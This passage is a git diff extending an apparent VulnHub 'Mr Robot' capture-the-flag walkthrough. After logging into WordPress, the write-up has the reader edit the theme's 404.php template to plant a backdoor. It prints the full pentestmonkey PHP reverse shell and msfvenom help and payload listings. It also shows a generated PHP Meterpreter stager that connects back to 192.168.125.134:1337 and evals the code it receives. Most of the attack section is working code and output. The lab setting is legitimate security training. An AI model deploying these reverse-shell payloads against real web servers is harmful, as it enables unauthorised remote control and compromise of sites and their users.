@@ -1926,9 +1926,434 @@ Now that we have the username and password we can log in and have a look around.
 <img src="https://github.com/Shadow-Admins/Cyber_Club/blob/028594f702f228020091207f020f8475f4224c8b/Starting_Point/VulnHub/MrRobot/images/inside.png"><br>
 </div>
 <p></p>
-A quick google for 'wordpress 4.3.1 exploit' and 'wordpress 4.3.1 backdoor' turned up a lot of results! It turns out this version is very insecure.
+A quick google for 'wordpress 4.3.1 exploit' and 'wordpress 4.3.1 backdoor' (we found the version in our earlier enumeration) turned up a lot of results! It turns out this version is very insecure.
 <p></p>
 If you have a quick look at this <a href="https://pentaroot.com/exploit-wordpress-backdoor-theme-pages/" rel="nofollow">site</a> you will see how a backdoor can be placed, we will now go through this process (with some modifications for learning).
+<p></p>
+To start with we need to navigate to the theme editor.
+<p></p>
+<div align="center">
+<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/64159a7f62f979c03a07cfa9cd9523281c1901c0/Starting_Point/VulnHub/MrRobot/images/insideedit.png"><br>
+</div>
+<p></p>
+Next we will change the theme to the 'Twenty Fourteen' theme.
+<p></p>
+<div align="center">
+<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/64159a7f62f979c03a07cfa9cd9523281c1901c0/Starting_Point/VulnHub/MrRobot/images/insidechangetheme.png"><br>
+</div>
+<p></p>
+Next we will select the '404.php' template.
+<p></p>
+<div align="center">
+<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/64159a7f62f979c03a07cfa9cd9523281c1901c0/Starting_Point/VulnHub/MrRobot/images/inside404.png"><br>
+</div>
+<p></p>
+And we end at a text editor page for the 404.php template.
+<p></p>
+<div align="center">
+<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/64159a7f62f979c03a07cfa9cd9523281c1901c0/Starting_Point/VulnHub/MrRobot/images/inside404template.png"><br>
+</div>
+<p></p>
+This is where we are going to place our php backdoor, we can either get it locally (if you're using kali or Parrot) at /usr/share/webshells/php/php-reverse-shell.php which requires you to change some values within the script (if you dont have this you can go to this <a href="https://github.com/pentestmonkey/php-reverse-shell" rel="nofollow">site</a> to get it). The script looks like this:
+<p></p>
+
+```
+<?php
+// php-reverse-shell - A Reverse Shell implementation in PHP
+// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
+//
+// This tool may be used for legal purposes only.  Users take full responsibility
+// for any actions performed using this tool.  The author accepts no liability
+// for damage caused by this tool.  If these terms are not acceptable to you, then
+// do not use this tool.
+//
+// In all other respects the GPL version 2 applies:
+//
+// This program is free software; you can redistribute it and/or modify
+// it under the terms of the GNU General Public License version 2 as
+// published by the Free Software Foundation.
+//
+// This program is distributed in the hope that it will be useful,
+// but WITHOUT ANY WARRANTY; without even the implied warranty of
+// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+// GNU General Public License for more details.
+//
+// You should have received a copy of the GNU General Public License along
+// with this program; if not, write to the Free Software Foundation, Inc.,
+// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
+//
+// This tool may be used for legal purposes only.  Users take full responsibility
+// for any actions performed using this tool.  If these terms are not acceptable to
+// you, then do not use this tool.
+//
+// You are encouraged to send comments, improvements or suggestions to
+// me at pentestmonkey@pentestmonkey.net
+//
+// Description
+// -----------
+// This script will make an outbound TCP connection to a hardcoded IP and port.
+// The recipient will be given a shell running as the current user (apache normally).
+//
+// Limitations
+// -----------
+// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
+// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
+// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
+//
+// Usage
+// -----
+// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.
+
+set_time_limit (0);
+$VERSION = "1.0";
+$ip = '127.0.0.1';  // CHANGE THIS
+$port = 1234;       // CHANGE THIS
+$chunk_size = 1400;
+$write_a = null;
+$error_a = null;
+$shell = 'uname -a; w; id; /bin/sh -i';
+$daemon = 0;
+$debug = 0;
+
+//
+// Daemonise ourself if possible to avoid zombies later
+//
+
+// pcntl_fork is hardly ever available, but will allow us to daemonise
+// our php process and avoid zombies.  Worth a try...
+if (function_exists('pcntl_fork')) {
+	// Fork and have the parent process exit
+	$pid = pcntl_fork();
+	
+	if ($pid == -1) {
+		printit("ERROR: Can't fork");
+		exit(1);
+	}
+	
+	if ($pid) {
+		exit(0);  // Parent exits
+	}
+
+	// Make the current process a session leader
+	// Will only succeed if we forked
+	if (posix_setsid() == -1) {
+		printit("Error: Can't setsid()");
+		exit(1);
+	}
+
+	$daemon = 1;
+} else {
+	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
+}
+
+// Change to a safe directory
+chdir("/");
+
+// Remove any umask we inherited
+umask(0);
+
+//
+// Do the reverse shell...
+//
+
+// Open reverse connection
+$sock = fsockopen($ip, $port, $errno, $errstr, 30);
+if (!$sock) {
+	printit("$errstr ($errno)");
+	exit(1);
+}
+
+// Spawn shell process
+$descriptorspec = array(
+   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
+   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
+   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
+);
+
+$process = proc_open($shell, $descriptorspec, $pipes);
+
+if (!is_resource($process)) {
+	printit("ERROR: Can't spawn shell");
+	exit(1);
+}
+
+// Set everything to non-blocking
+// Reason: Occsionally reads will block, even though stream_select tells us they won't
+stream_set_blocking($pipes[0], 0);
+stream_set_blocking($pipes[1], 0);
+stream_set_blocking($pipes[2], 0);
+stream_set_blocking($sock, 0);
+
+printit("Successfully opened reverse shell to $ip:$port");
+
+while (1) {
+	// Check for end of TCP connection
+	if (feof($sock)) {
+		printit("ERROR: Shell connection terminated");
+		break;
+	}
+
+	// Check for end of STDOUT
+	if (feof($pipes[1])) {
+		printit("ERROR: Shell process terminated");
+		break;
+	}
+
+	// Wait until a command is end down $sock, or some
+	// command output is available on STDOUT or STDERR
+	$read_a = array($sock, $pipes[1], $pipes[2]);
+	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
+
+	// If we can read from the TCP socket, send
+	// data to process's STDIN
+	if (in_array($sock, $read_a)) {
+		if ($debug) printit("SOCK READ");
+		$input = fread($sock, $chunk_size);
+		if ($debug) printit("SOCK: $input");
+		fwrite($pipes[0], $input);
+	}
+
+	// If we can read from the process's STDOUT
+	// send data down tcp connection
+	if (in_array($pipes[1], $read_a)) {
+		if ($debug) printit("STDOUT READ");
+		$input = fread($pipes[1], $chunk_size);
+		if ($debug) printit("STDOUT: $input");
+		fwrite($sock, $input);
+	}
+
+	// If we can read from the process's STDERR
+	// send data down tcp connection
+	if (in_array($pipes[2], $read_a)) {
+		if ($debug) printit("STDERR READ");
+		$input = fread($pipes[2], $chunk_size);
+		if ($debug) printit("STDERR: $input");
+		fwrite($sock, $input);
+	}
+}
+
+fclose($sock);
+fclose($pipes[0]);
+fclose($pipes[1]);
+fclose($pipes[2]);
+proc_close($process);
+
+// Like print, but does nothing if we've daemonised ourself
+// (I can't figure out how to redirect STDOUT like a proper daemon)
+function printit ($string) {
+	if (!$daemon) {
+		print "$string\n";
+	}
+}
+
+?> 
+```
+
+<p></p>
+You would change:
+<br>
+$ip = '127.0.0.1';  // CHANGE THIS
+<br>
+$port = 1234;       // CHANGE THIS
+<p></p>
+To your ip and your port, alternatevly and how I will do it is to create your reverse shell using msfvenom. The help page for msfvenom looks like this:
+<p></p>
+
+```
+❯ msfvenom --help
+MsfVenom - a Metasploit standalone payload generator.
+Also a replacement for msfpayload and msfencode.
+Usage: /usr/bin/msfvenom [options] <var=val>
+Example: /usr/bin/msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> -f exe -o payload.exe
+
+Options:
+    -l, --list            <type>     List all modules for [type]. Types are: payloads, encoders, nops, platforms, archs, encrypt, formats, all
+    -p, --payload         <payload>  Payload to use (--list payloads to list, --list-options for arguments). Specify '-' or STDIN for custom
+        --list-options               List --payload <value>'s standard, advanced and evasion options
+    -f, --format          <format>   Output format (use --list formats to list)
+    -e, --encoder         <encoder>  The encoder to use (use --list encoders to list)
+        --service-name    <value>    The service name to use when generating a service binary
+        --sec-name        <value>    The new section name to use when generating large Windows binaries. Default: random 4-character alpha string
+        --smallest                   Generate the smallest possible payload using all available encoders
+        --encrypt         <value>    The type of encryption or encoding to apply to the shellcode (use --list encrypt to list)
+        --encrypt-key     <value>    A key to be used for --encrypt
+        --encrypt-iv      <value>    An initialization vector for --encrypt
+    -a, --arch            <arch>     The architecture to use for --payload and --encoders (use --list archs to list)
+        --platform        <platform> The platform for --payload (use --list platforms to list)
+    -o, --out             <path>     Save the payload to a file
+    -b, --bad-chars       <list>     Characters to avoid example: '\x00\xff'
+    -n, --nopsled         <length>   Prepend a nopsled of [length] size on to the payload
+        --pad-nops                   Use nopsled size specified by -n <length> as the total payload size, auto-prepending a nopsled of quantity (nops minus payload length)
+    -s, --space           <length>   The maximum size of the resulting payload
+        --encoder-space   <length>   The maximum size of the encoded payload (defaults to the -s value)
+    -i, --iterations      <count>    The number of times to encode the payload
+    -c, --add-code        <path>     Specify an additional win32 shellcode file to include
+    -x, --template        <path>     Specify a custom executable file to use as a template
+    -k, --keep                       Preserve the --template behaviour and inject the payload as a new thread
+    -v, --var-name        <value>    Specify a custom variable name to use for certain output formats
+    -t, --timeout         <second>   The number of seconds to wait when reading the payload from STDIN (default 30, 0 to disable)
+    -h, --help                       Show this message
+```
+
+<p></p>
+Lets start by listing the payloads and search for the php payloads, we do this by using this command:
+<p></p>
+
+```
+msfvenom --list payloads | grep php
+```
+
+<p></p>
+which outputs:
+<p></p>
+
+```
+❯ msfvenom --list payloads | grep php
+    cmd/unix/reverse_php_ssl                            Creates an interactive shell via php, uses SSL
+    php/bind_perl                                       Listen for a connection and spawn a command shell via perl (persistent)
+    php/bind_perl_ipv6                                  Listen for a connection and spawn a command shell via perl (persistent) over IPv6
+    php/bind_php                                        Listen for a connection and spawn a command shell via php
+    php/bind_php_ipv6                                   Listen for a connection and spawn a command shell via php (IPv6)
+    php/download_exec                                   Download an EXE from an HTTP URL and execute it
+    php/exec                                            Execute a single system command
+    php/meterpreter/bind_tcp                            Run a meterpreter server in PHP. Listen for a connection
+    php/meterpreter/bind_tcp_ipv6                       Run a meterpreter server in PHP. Listen for a connection over IPv6
+    php/meterpreter/bind_tcp_ipv6_uuid                  Run a meterpreter server in PHP. Listen for a connection over IPv6 with UUID Support
+    php/meterpreter/bind_tcp_uuid                       Run a meterpreter server in PHP. Listen for a connection with UUID Support
+    php/meterpreter/reverse_tcp                         Run a meterpreter server in PHP. Reverse PHP connect back stager with checks for disabled functions
+    php/meterpreter/reverse_tcp_uuid                    Run a meterpreter server in PHP. Reverse PHP connect back stager with checks for disabled functions
+    php/meterpreter_reverse_tcp                         Connect back to attacker and spawn a Meterpreter server (PHP)
+    php/reverse_perl                                    Creates an interactive shell via perl
+    php/reverse_php                                     Reverse PHP connect back shell with checks for disabled functions
+    php/shell_findsock                                  Spawn a shell on the established connection to the webserver. Unfortunately, this payload can leave conspicuous evil-looking entries
+                                                        /hop.php to the PHP server you wish to use as a hop.
+                                                        ication over an HTTP or HTTPS hop point. Note that you must first upload data/hop/hop.php to the PHP server you wish to use as a hop
+                                                        load data/hop/hop.php to the PHP server you wish to use as a hop.
+```
+
+<p></p>
+For this exercise we will use the 'php/meterpreter/reverse_tcp' payload. To find out more information on this payload we run the following command:
+<p></p>
+
+```
+msfvenom -p php/meterpreter/reverse_tcp --list-options
+```
+
+<p></p>
+Which outputs this:
+<p></p>
+
+```
+❯ msfvenom -p php/meterpreter/reverse_tcp --list-options
+Options for payload/php/meterpreter/reverse_tcp:
+=========================
+
+
+       Name: PHP Meterpreter, PHP Reverse TCP Stager
+     Module: payload/php/meterpreter/reverse_tcp
+   Platform: PHP
+       Arch: php
+Needs Admin: No
+ Total size: 1101
+       Rank: Normal
+
+Provided by:
+    egypt <egypt@metasploit.com>
+
+Basic options:
+Name   Current Setting  Required  Description
+----   ---------------  --------  -----------
+LHOST                   yes       The listen address (an interface may be specified)
+LPORT  4444             yes       The listen port
+
+Description:
+  Run a meterpreter server in PHP. Reverse PHP connect back stager 
+  with checks for disabled functions
+
+
+
+Advanced options for payload/php/meterpreter/reverse_tcp:
+=========================
+
+    Name                         Current Setting  Required  Description
+    ----                         ---------------  --------  -----------
+    AutoLoadStdapi               true             yes       Automatically load the Stdapi extension
+    AutoRunScript                                 no        A script to run automatically on session creation.
+    AutoSystemInfo               true             yes       Automatically capture system information on initialization.
+    AutoUnhookProcess            false            yes       Automatically load the unhook extension and unhook the process
+    AutoVerifySessionTimeout     30               no        Timeout period to wait for session validation to occur, in seconds
+    EnableStageEncoding          false            no        Encode the second stage payload
+    EnableUnicodeEncoding        false            yes       Automatically encode UTF-8 strings as hexadecimal
+    HandlerSSLCert                                no        Path to a SSL certificate in unified PEM format, ignored for HTTP transports
+    InitialAutoRunScript                          no        An initial script to run on session creation (before AutoRunScript)
+    PayloadProcessCommandLine                     no        The displayed command line that will be used by the payload
+    PayloadUUIDName                               no        A human-friendly name to reference this unique payload (requires tracking)
+    PayloadUUIDRaw                                no        A hex string representing the raw 8-byte PUID value for the UUID
+    PayloadUUIDSeed                               no        A string to use when generating the payload UUID (deterministic)
+    PayloadUUIDTracking          false            yes       Whether or not to automatically register generated UUIDs
+    PingbackRetries              0                yes       How many additional successful pingbacks
+    PingbackSleep                30               yes       Time (in seconds) to sleep between pingbacks
+    ReverseAllowProxy            false            yes       Allow reverse tcp even with Proxies specified. Connect back will NOT go through proxy but directly to LHOST
+    ReverseListenerBindAddress                    no        The specific IP address to bind to on the local system
+    ReverseListenerBindPort                       no        The port to bind to on the local system if different from LPORT
+    ReverseListenerComm                           no        The specific communication channel to use for this listener
+    ReverseListenerThreaded      false            yes       Handle every connection in a new thread (experimental)
+    SessionCommunicationTimeout  300              no        The number of seconds of no activity before this session should be killed
+    SessionExpirationTimeout     604800           no        The number of seconds before this session should be forcibly shut down
+    SessionRetryTotal            3600             no        Number of seconds try reconnecting for on network failure
+    SessionRetryWait             10               no        Number of seconds to wait between reconnect attempts
+    StageEncoder                                  no        Encoder to use if EnableStageEncoding is set
+    StageEncoderSaveRegisters                     no        Additional registers to preserve in the staged payload if EnableStageEncoding is set
+    StageEncodingFallback        true             no        Fallback to no encoding if the selected StageEncoder is not compatible
+    StagerRetryCount             10               no        The number of times the stager should retry if the first connect fails
+    StagerRetryWait              5                no        Number of seconds to wait for the stager between reconnect attempts
+    VERBOSE                      false            no        Enable detailed status messages
+    WORKSPACE                                     no        Specify the workspace for this module
+
+Evasion options for payload/php/meterpreter/reverse_tcp:
+=========================
+
+    Name  Current Setting  Required  Description
+    ----  ---------------  --------  -----------
+```
+
+<p></p>
+From this output we can see the basic inputs we need to provide being 'LHOST' and 'LPORT' so lets create our backdoor. The command looks like this:
+<p></p>
+
+```
+msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.125.134 lport=1337 -f raw
+```
+
+<p></p>
+Looking at this command we can see that the first flag <kbd>-p</kbd> points to the payload the second input is 'lhost=' pointing to our eth1 address followed by 'lport=' which could be any port you choose and finally our output file type being raw.
+<br>
+This command outputs:
+<p></p>
+
+```
+❯ msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.125.134 lport=1337 -f raw
+[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
+[-] No arch selected, selecting arch: php from the payload
+No encoder specified, outputting raw payload
+Payload size: 1116 bytes
+/*<?php /**/ error_reporting(0); $ip = '192.168.125.134'; $port = 1337; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();
+```
+
+<p></p>
+We have created our own php backdoor (better than using someone elses right!) we can now use this to gain access to our target machine! We need to copy everything from <?php until die(); and past that into the 404.php template on the website.
+<p></p>
+<div align="center">
+<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/64159a7f62f979c03a07cfa9cd9523281c1901c0/Starting_Point/VulnHub/MrRobot/images/inside404template.png"><br>
+</div>
+<p></p>
+
+
+
+
+
+
+
 <p></p>
 
 
